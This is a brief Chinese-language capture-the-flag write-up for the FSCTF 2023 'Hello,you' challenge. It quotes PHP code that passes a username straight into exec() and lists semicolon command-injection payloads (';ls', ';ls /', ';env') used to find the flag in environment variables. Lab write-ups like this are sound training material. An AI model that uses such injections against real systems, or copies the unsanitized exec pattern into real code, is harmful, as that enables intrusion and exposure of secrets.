# 【FSCTF 2023】Hello,you


# [FSCTF 2023]Hello,you

&gt; 我是在nss做的，好像原题flag位置不一样。
&gt;
&gt; 原题好像在根目录，但是nss这个在env

## 思路

* 看页面源码可以得到部分源码

  ```
  &lt;?php
  $input = isset($_GET[&#39;input&#39;]) ? $_GET[&#39;input&#39;] : &#39;&#39;;
  
  // 执行命令并返回结果
  function executeCommand($command) {
  $output = &#39;&#39;;
  exec($command, $output);
  return $output;
  }
  
  // 注册用户
  function registerUser($username) {
  // .........
  $command = &#34;echo Hello, &#34; . $username;
  $result = executeCommand($command);
  return $result;
  }
  
  // 处理注册请求
  if (isset($_POST[&#39;submit&#39;])) {
  $username = $_POST[&#39;username&#39;];
  $result = registerUser($username);
  }
  ```
  
* 可以知道是`exec`直接执行指令

* 直接使用指令无法输出

  这里的解释是一次执行多个命令，命令之间需要用连接符连接
  
  &gt; 好像是这么说的吧，不确定
  &gt;
  &gt; 但是肯定是前面要加`;`才能执行
  
* 根目录没有要在环境里面找


## Payload

```
;ls
;ls /
;env
```

## 总结

* RCE

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-fsctf-2023helloyou/  

